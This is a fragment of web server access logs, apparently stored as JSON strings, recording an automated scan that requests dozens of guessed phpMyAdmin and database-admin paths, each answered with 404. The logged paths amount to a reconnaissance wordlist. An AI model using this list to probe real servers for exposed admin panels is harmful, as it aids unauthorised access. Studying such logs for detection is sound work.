      "127.0.0.1 - - [30/Jan/2021:15:59:36 +0000] \"GET /phpMyAdmin5/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:36 +0000] \"GET /mysql/admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:37 +0000] \"GET /mysql/dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:37 +0000] \"GET /mysql/sqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:37 +0000] \"GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:38 +0000] \"GET /2phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:38 +0000] \"GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:38 +0000] \"GET /phpmy/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:39 +0000] \"GET /phppma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:39 +0000] \"GET /myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:39 +0000] \"GET /shopdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:40 +0000] \"GET /MyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:40 +0000] \"GET /program/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:41 +0000] \"GET /PMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:41 +0000] \"GET /dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:41 +0000] \"GET /pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:42 +0000] \"GET /db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:42 +0000] \"GET /admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:42 +0000] \"GET /db/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:43 +0000] \"GET /db/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:43 +0000] \"GET /sqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:43 +0000] \"GET /mysqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:44 +0000] \"GET /php-myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:44 +0000] \"GET /phpmy-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:44 +0000] \"GET /mysqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:45 +0000] \"GET /mysql-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:45 +0000] \"GET /admin/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:45 +0000] \"GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:46 +0000] \"GET /admin/sysadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:46 +0000] \"GET /admin/sqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:46 +0000] \"GET /admin/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:47 +0000] \"GET /admin/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:47 +0000] \"GET /admin/pMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:47 +0000] \"GET /mysql/pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:48 +0000] \"GET /mysql/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:48 +0000] \"GET /mysql/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:49 +0000] \"GET /mysql/pMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:49 +0000] \"GET /sql/phpmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:49 +0000] \"GET /sql/php-myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:50 +0000] \"GET /sql/phpmy-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:50 +0000] \"GET /sql/sql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:50 +0000] \"GET /sql/myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:51 +0000] \"GET /sql/webadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:51 +0000] \"GET /sql/sqlweb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:51 +0000] \"GET /sql/websql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:52 +0000] \"GET /sql/webdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:52 +0000] \"GET /sql/sqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:52 +0000] \"GET /sql/sql-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:53 +0000] \"GET /sql/phpmyadmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:53 +0000] \"GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:53 +0000] \"GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:54 +0000] \"GET /db/myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:54 +0000] \"GET /db/webadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:54 +0000] \"GET /db/dbweb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:55 +0000] \"GET /db/websql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:55 +0000] \"GET /db/webdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:55 +0000] \"GET /db/dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:56 +0000] \"GET /db/db-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:56 +0000] \"GET /db/phpmyadmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:56 +0000] \"GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:57 +0000] \"GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:57 +0000] \"GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:58 +0000] \"GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:58 +0000] \"GET /administrator/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:58 +0000] \"GET /administrator/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:59 +0000] \"GET /administrator/pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:59 +0000] \"GET /administrator/PMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:59 +0000] \"GET /administrator/admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:00 +0000] \"GET /phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:00 +0000] \"GET /phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:00 +0000] \"GET /phpMyAdmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:01 +0000] \"GET /phpMyAdmin-3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:01 +0000] \"GET /php-my-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:01 +0000] \"GET /PMA2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:02 +0000] \"GET /PMA2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:02 +0000] \"GET /PMA2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:02 +0000] \"GET /PMA2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:03 +0000] \"GET /PMA2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:03 +0000] \"GET /PMA2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:03 +0000] \"GET /PMA2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:04 +0000] \"GET /PMA2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:04 +0000] \"GET /PMA2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:04 +0000] \"GET /PMA2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:05 +0000] \"GET /pma2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:05 +0000] \"GET /pma2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:05 +0000] \"GET /pma2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:06 +0000] \"GET /pma2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:06 +0000] \"GET /pma2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:06 +0000] \"GET /pma2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:07 +0000] \"GET /pma2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:07 +0000] \"GET /pma2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:08 +0000] \"GET /pma2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:08 +0000] \"GET /pma2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:08 +0000] \"GET /phpmyadmin2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:09 +0000] \"GET /phpmyadmin2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:09 +0000] \"GET /phpmyadmin2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:09 +0000] \"GET /phpmyadmin2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
